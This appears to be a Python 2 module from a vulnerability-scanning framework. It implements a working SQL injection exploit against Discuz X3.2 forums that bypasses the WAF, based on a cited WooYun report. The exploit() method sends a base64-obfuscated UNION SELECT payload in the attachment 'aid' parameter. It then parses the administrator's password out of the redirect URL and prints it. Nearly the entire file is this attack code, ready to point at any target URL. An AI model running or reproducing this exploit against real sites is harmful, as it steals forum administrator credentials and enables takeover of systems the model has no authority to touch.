#coding=utf-8
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
#from libs.functions import *
#import modules.*
import re
import urllib2
import urllib

class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）',
        'author':'demon',
        'update':'2015/06/04',
        'site':'http://www.dawner.info',
        'vuln_type':'sqlinjection',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-074970'
        }
    opts  = {
        'dic':'/data/tmp/url.txt or N',
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        #print 'Get it'+self.url
        exp_url = self.url+'forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4N0MzMjc0NzQ3QyxwYXNzd29yZCkgZnJvbSBwcmVfY29tbW9uX21lbWJlciB3aGVyZSAgdXNlcm5hbWUgbGlrZSAnYWRtaW58eHx5%3D'
        #resp = urllib2.urlopen(exp_url).read()
        #print resp
        real_url = urllib2.urlopen(exp_url).geturl()
        #print real_url
        try:
            if 'admin' in real_url:
                match = re.search(r'admin\|2tt\|\S+',real_url)
                if match:
                    print '\n[!]Discuzx2.0 Pass:'+match.group(0).split('|')[2]+'\n'

                    return 'Dz2.0_pass:'+match.group(0).split('|')[2]
        except Exception,e:
            print e

